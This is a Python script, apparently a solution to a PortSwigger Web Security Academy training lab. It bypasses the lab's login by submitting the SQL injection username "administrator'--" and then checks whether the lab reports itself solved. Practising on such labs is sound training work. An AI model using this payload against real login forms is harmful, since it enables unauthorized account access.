# https://portswigger.net/web-security/sql-injection/lab-login-bypass
# Lab: SQL injection vulnerability allowing login bypass
# Difficulty: Apprentice

import requests
from pwn import log

sub = '0ab2002404bd33cf85377bdd007f0002'
url = f'https://{sub}.web-security-academy.net/'

def exploit():
    s = requests.session()
    r = s.get(f"{url}login", params={"username": "administrator'--", "password": "random"})
    
    log.info(f"Status code: {r.status_code}")    
    
    r = s.get(url)
    if 'Congratulations, you solved the lab!' in r.text:
        log.success('Lab solved')
    else:
        log.failure('Lab not solved yet')

if __name__ == '__main__':
    exploit()